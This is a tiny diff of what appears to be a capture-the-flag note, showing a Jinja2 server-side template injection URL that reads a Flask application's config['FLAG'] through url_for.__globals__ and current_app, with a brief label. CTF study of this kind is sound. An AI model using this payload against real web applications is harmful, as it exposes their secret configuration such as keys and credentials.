@@ -1,1 +1,5 @@
 http://shrine.chal.ctf.westerns.tokyo/shrine/{{ url_for.__globals__['current_app'].config['FLAG'] }}
+
+
+ssti(server-side template injection) 
+get current_app information
